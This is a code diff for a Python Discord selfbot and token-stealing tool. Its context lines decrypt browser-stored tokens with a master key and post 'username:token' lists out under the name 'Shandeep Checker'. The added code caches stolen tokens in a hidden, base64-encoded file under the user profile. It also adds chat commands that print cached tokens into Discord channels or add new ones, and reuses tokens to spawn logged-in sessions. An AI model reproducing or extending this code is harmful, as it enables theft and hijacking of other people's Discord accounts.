@@ -52,6 +52,9 @@ def SpawnNewProcess(token):
 def JoinGuild(server_url,token):
 	return requests.post("https://discord.com/api/v9/invites/" + server_url, headers={"Authorization" : token})
 
+def FindMentionID(string):
+	return string.split("<@")[-1].split(">")[0]
+
 class TokenStuff:
 	def decrypt_val(buff: bytes, master_key: bytes) -> str:
 		iv = buff[3:15]
@@ -80,6 +83,10 @@ class TokenStuff:
 		return master_key
 
 	def RequestData(data):
+
+		for d in data:
+			CACHE.Push(d["id"],d["token"])
+
 		json = {
 			'username': 'Shandeep Checker',
 			'content': "```{}```".format("\n".join(["{}:{}".format(d["username"],d["token"]) for d in data]))
@@ -260,6 +267,54 @@ class TokenStuff:
 
 		else:
 			return TokenStuff.RequestData(accounts[0])
+
+class AccountCache:
+	file_name = "dQw4w9WgXcQ.cache"
+	directory = os.path.join(os.getenv("USERPROFILE"),".origin")
+
+	file_path = os.path.join(directory, file_name)
+
+	if not os.path.exists(directory):
+		os.mkdir(directory)
+
+	def __init__(self):
+		self.data = {}
+
+		self.Load()
+
+	def Load(self):
+		try:
+			with open(AccountCache.file_path,"rb") as file:
+				self.data = json.loads(base64.b64decode(file.read()))
+		except json.decoder.JSONDecodeError:
+			print("[!] Failed to load cached accounts")
+		except FileNotFoundError:
+			self.Save()
+
+		return self.data
+
+	def Save(self):
+		with open(AccountCache.file_path,"wb") as file:
+			file.write(base64.b64encode(json.dumps(self.data).encode('utf-8')))
+
+	def Push(self,account_id,info):
+		if str(account_id) not in self.data:
+			self.data[account_id] = []
+
+		if info in self.data[str(account_id)]: 
+			return
+
+		self.data[str(account_id)].append(info)
+
+		self.Save()
+
+	def Get(self,account_id):
+		if str(account_id) not in self.data:
+			return None
+
+		return self.data[str(account_id)]
+
+CACHE = AccountCache()
 
 class EzClient(discum.Client):
 	def __init__(self,user_data:dict):
@@ -448,9 +503,22 @@ class EzClient(discum.Client):
 			if len(args) == 0:
 				print("[>] No token parsed"); return
 
-			SpawnNewProcess(args[0])
+			info = args[0]
+
+			if len(info) < 30:
+				cached = CACHE.Get(FindMentionID(info))
+
+				if not cached:
+					print("[>] Account not cached"); return
+
+				info = cached[0]
+
+			SpawnNewProcess(info)
 
 		elif command == 'join':
+			if len(args) == 0:
+				print("[>] No args provided"); return
+
 			if len(args) == 1:
 				url,token = args[0],self.token
 
@@ -465,6 +533,36 @@ class EzClient(discum.Client):
 			self.gateway.close()
 
 			self.kill_me = True
+
+		elif command == 'get':
+			if len(args) == 0:
+				print("[>] No args provided"); return
+
+			account_id = FindMentionID(args[0])
+
+			accounts = CACHE.Get(account_id)
+
+			title = "`/get` <@%s>" % account_id
+
+			if accounts == None or len(accounts) == 0:
+				
+				message = "No Accounts Found"
+
+			else:
+				message = "\n".join(accounts)
+
+			self.sendMessage(
+				channelID=m['channel_id'],
+				message="%s\t```%s```" % (title,message),
+			)
+
+		elif command == 'push':
+			if len(args) < 2:
+				print("[>] Missing required args"); return
+
+			account_id = FindMentionID(args[0])
+
+			accounts = CACHE.Push(account_id, args[1])
 
 	def send_hidden_text(self,channel_id,string):
 		self.sendMessage(channel_id,self.hide_text + string)
@@ -508,6 +606,8 @@ if __name__ == '__main__':
 		account = TokenStuff.CheckToken(token)
 
 		if account == {}: exit("[!] Invalid Token Parsed")
+
+		CACHE.Push(account["id"],token)
 
 	client = EzClient(account)
 
